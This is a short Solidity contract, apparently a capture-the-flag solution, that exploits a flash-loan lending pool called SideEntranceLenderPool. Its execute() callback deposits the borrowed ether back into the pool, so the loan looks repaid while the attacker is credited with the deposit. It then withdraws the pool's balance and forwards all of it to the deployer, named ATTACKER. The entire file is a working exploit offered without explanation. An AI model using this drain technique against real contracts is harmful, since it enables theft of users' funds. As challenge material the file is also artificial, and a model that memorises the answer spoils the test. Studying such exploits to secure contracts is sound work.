pragma solidity >=0.8;


contract AttackSideEntranceLenderPool {
    address payable private immutable ATTACKER;
    constructor() {
        ATTACKER = payable(msg.sender);
    }

    function execute() external payable {
        payable(msg.sender).call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
    }

    function attack(address sideEntranceLenderPool, uint256 amount) external {
        sideEntranceLenderPool.call(
            abi.encodeWithSignature("flashLoan(uint256)", amount)
        );
    }

    function withdrawFromPool(address sideEntranceLenderPool) external {
        sideEntranceLenderPool.call(
            abi.encodeWithSignature("withdraw()")
        );
        uint256 balanceFromPool = address(this).balance;
        ATTACKER.call{value: balanceFromPool}("");
    }

    receive () external payable {}
}